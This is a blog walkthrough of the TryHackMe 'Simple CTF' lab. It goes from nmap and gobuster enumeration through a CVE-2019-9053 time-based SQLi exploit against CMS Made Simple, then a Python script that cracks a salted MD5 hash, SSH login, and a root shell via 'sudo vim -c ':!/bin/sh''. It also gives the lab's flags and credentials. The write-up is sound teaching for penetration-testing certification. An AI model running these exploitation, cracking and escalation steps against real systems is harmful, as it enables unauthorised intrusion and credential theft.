---
title: "Simple CTF"
date: 2025-10-13
draft: false
description: "Walkthrough of Simple CTF from TryHackMe. Anonymous FTP, SQLi CVE-2019-9053 on CMS Made Simple, salted hash cracking and privilege escalation via sudo vim — eJPT preparation."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "sqli",
    "ftp",
    "cms",
    "vim",
    "sudo",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 4
---

## Summary

**Simple CTF** is the fourth machine in the _Road to eJPTv2_ series and the most technically varied so far. It introduces three new vectors: **anonymous FTP access**, **SQLi exploitation with a real CVE** (CVE-2019-9053) against CMS Made Simple, and **privilege escalation via sudo vim**. Additionally, the obtained hash is salted, requiring a custom cracking script — a differentiating skill.

| Attribute      | Value                                                      |
| -------------- | ---------------------------------------------------------- |
| **Platform**   | TryHackMe                                                  |
| **Difficulty** | Easy                                                       |
| **OS**         | Linux                                                      |
| **Room**       | [Simple CTF](https://tryhackme.com/room/easyctf)           |
| **Skills**     | FTP Enum, Web Enum, SQLi, Hash Cracking, SSH, Sudo Privesc |

### 🎥 Video version

{{< youtube fC-5pqH2h54 >}}

> If you prefer to follow the walkthrough step by step, keep reading. The video covers the same process in visual format.

### Tools used

- `nmap` — port and service enumeration
- `ftp` — anonymous server access
- `gobuster` — web directory fuzzing
- `searchsploit` — known exploit search
- Custom Python3 script — CVE-2019-9053 exploitation
- Custom Python3 script — salted MD5 hash cracking
- `ssh` — access with obtained credentials

### Solution overview

1. Nmap reveals three services: FTP (21), HTTP (80) and SSH on non-standard port (2222)
2. FTP allows anonymous login but passive mode times out
3. Gobuster discovers `/simple/` — CMS Made Simple version 2.2.8
4. Searchsploit identifies CVE-2019-9053 — time-based SQLi
5. Python3 script extracts: salt, user `mitch`, email and MD5 hash
6. Custom cracking script obtains the password: `secret`
7. SSH access as `mitch` on port 2222 → user flag
8. `sudo -l` reveals `mitch` can run vim as root
9. Vim abuse with `sudo vim -c ':!/bin/sh'` → root

---

## Reconnaissance

### Connectivity check

```bash
ping -c 1 10.201.40.102
64 bytes from 10.201.40.102: icmp_seq=1 ttl=60 time=140 ms
```

> **TTL=60** → target is **Linux**.

### Nmap port scan

Initial sweep of all TCP ports:

```bash
nmap 10.201.40.102 -n -Pn -sS -p- --min-rate 5000 -oG allTCPports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Three open ports — more attack surface than previous machines. Port 2222 stands out: Nmap identifies it as EtherNetIP-1, but version scanning will reveal its true nature.

Targeted scan with version detection and scripts:

```bash
nmap 10.201.40.102 -n -Pn -sS -sVC -p21,80,2222 --min-rate 5000 -oN simplescan.txt
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
```

> **Key findings:**
>
> - **Port 21:** vsftpd 3.0.3 with **anonymous login enabled** — first vector to explore
> - **Port 80:** Apache with `robots.txt` mentioning `/openemr-5_0_1_3` — possible CMS
> - **Port 2222:** SSH running on non-standard port — admins sometimes move SSH to avoid bots, but it's not a real security measure

### Anonymous FTP enumeration

Anonymous FTP login means we can connect without credentials:

```bash
ftp 10.201.40.102 21
Name: anonymous
230 Login successful.
ftp> ls
229 Entering Extended Passive Mode (|||43213|)
```

> **Passive mode issue:** the FTP server enters extended passive mode but times out when listing directories. This is common when there are network restrictions between client and server. Anonymous FTP doesn't give us direct useful information here, but confirms lax security configuration on the server.

### Web enumeration

#### robots.txt

Already detected by Nmap — we review it manually:

```
User-agent: *
Disallow: /
Disallow: /openemr-5_0_1_3
```

> **Possible user:** the file comment mentions `mike` as original author. We note it for possible bruteforce later.

#### Fuzzing with Gobuster

```bash
gobuster dir -u http://10.201.40.102 \
  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 50 -x php,txt,xml,html,bak
    /index.html     (Status: 200)
    /robots.txt     (Status: 200)
    /simple         (Status: 301)
    /server-status  (Status: 403)
```

> **Key finding:** `/simple/` directory — navigating to `http://10.201.40.102/simple/` we find **CMS Made Simple**. Reviewing the page source code we identify the version: **2.2.8**.

### Exploit search with Searchsploit

With the CMS version identified, we search for known exploits:

```bash
searchsploit simple CMS 2.2.8
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
```

> **CVE-2019-9053** — Unauthenticated time-based SQLi in CMS Made Simple versions prior to 2.2.10. No credentials needed to exploit it, making it especially dangerous.

---

## Exploitation

### CVE-2019-9053: Time-based SQL Injection

The original Searchsploit exploit is written in Python 2. Since we use Python 3, we need an adapted version. The exploit uses **time-based blind SQLi** to extract information character by character by measuring server response times.

Install dependencies:

```bash
pip install requests termcolor
```

Run the exploit pointing to the CMS directory:

```bash
python3 exploit.py -u http://10.201.40.102/simple/
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

> **How does time-based SQLi work?** The exploit injects SQL queries that include `SLEEP()` — if the condition is true, the server takes longer to respond. By measuring these delays, the script extracts information bit by bit. Slower than direct SQLi but equally effective.

### Salted MD5 hash cracking

The obtained hash is not a simple MD5 — it's **salted** with `1dac0d92e9fa6bb2`. This means the hash is `MD5(salt + password)`, not simply `MD5(password)`. Standard tools like `john` or `hashcat` require special configuration for salted hashes, so we use a custom Python3 script:

```python
#!/usr/bin/env python3
import hashlib, sys

def try_crack(salt, target_hash, wordlist_path):
    target_hash = target_hash.strip().lower()
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            candidate = line.rstrip('\n')
            h = hashlib.md5((salt + candidate).encode('utf-8')).hexdigest()
            if h == target_hash:
                print("[+] Password found:", candidate)
                return candidate
    print("[-] Not found in wordlist")

salt = sys.argv[1]
target_hash = sys.argv[2]
wordlist = sys.argv[3]
try_crack(salt, target_hash, wordlist)
```

```bash
python3 crack.py 1dac0d92e9fa6bb2 0c01f4468bd75d7a84c7eb73846e8d96 /usr/share/wordlists/rockyou.txt
[+] Found (full match): secret
```

> **Credentials obtained:** `mitch:secret`

---

## Post-exploitation

### SSH access

With the obtained credentials, we access via SSH on the non-standard port:

```bash
ssh mitch@10.201.40.102 -p 2222
Welcome to Ubuntu 16.04.6 LTS
mitch@Machine:~$
```

Stabilize the shell:

```bash
export TERM=xterm
export SHELL=bash
```

### Identity and context

```bash
id
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
```

### User flag

```bash
cat ~/user.txt
```

> **User flag:** `G00d j0b, keep up!`

### System user enumeration

```bash
ls /home
mitch  sunbath
```

Another user exists: `sunbath`. Noted for possible lateral movement.

### SUID binary search

```bash
find / -perm -4000 2>/dev/null
```

No exploitable SUID binaries on this machine — all found are standard system binaries. We discard this vector and move on.

### Sudo enumeration

```bash
sudo -l
User mitch may run the following commands on Machine:
(root) NOPASSWD: /usr/bin/vim
```

> **Critical finding:** `mitch` can run `vim` as root without a password. Vim has the ability to execute shell commands internally — this is direct escalation.

---

## Privilege Escalation

### Sudo vim abuse

Vim allows executing operating system commands directly from its command mode with `:!command`. If we run it with sudo, those commands run as root:

```bash
sudo vim -c ':!/bin/sh'
```

```bash
# whoami
root
```

> **What does this command do?**
>
> - `sudo vim` opens vim with root privileges
> - `-c ':!/bin/sh'` automatically executes the command `:!/bin/sh` on startup
> - `:!` in vim executes system commands
> - `/bin/sh` opens a shell — which inherits vim's root privileges

### Root flag

```bash
cd /root
cat root.txt
```

> **Root flag:** `W3ll d0n3. You made it!`

---

## Lessons learned

- **Anonymous FTP in production is bad practice** — Although it didn't give direct access here, it confirms lax configurations. In real environments, anonymous FTP can expose sensitive files.
- **Always find the exact CMS or web application version** — CMS Made Simple 2.2.8 had a public SQLi. A real attacker would immediately query CVE databases after identifying the software and version. This information is in the page source code.
- **Salted hashes require custom cracking** — A simple MD5 hash is cracked with `john` or `hashcat` directly. A salted hash requires your tool to know the salt. Understanding how salted hashes work — and writing a script to crack them — is a differentiating skill.
- **SSH on non-standard port is not security** — Moving SSH to port 2222 only avoids basic bots. Nmap detects it in seconds with version scanning. Real security comes from SSH keys, 2FA, and service hardening.
- **`sudo -l` always, always, always** — In all four machines so far, `sudo -l` was the privesc vector or confirmed its absence. It's the first command you should run after getting a shell.
- **GTFOBins for sudo** — Vim, less, more, nano, python, perl... dozens of common tools can be used to escalate privileges if run via sudo. GTFOBins is the definitive reference.

### For the eJPT

This machine exercises skills directly evaluated on the eJPT:

- Multiple service enumeration (FTP, HTTP, SSH)
- Web application version identification
- Public exploit usage (Searchsploit + CVE)
- Basic SQLi understanding
- Hash cracking (with and without salt)
- SSH access with obtained credentials
- Privilege escalation via sudo misconfigurations

**Approximate solving time:** 40-60 minutes — time-based SQLi is slow by nature.

---

## References

- [Simple CTF — TryHackMe](https://tryhackme.com/room/easyctf)
- [CVE-2019-9053 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
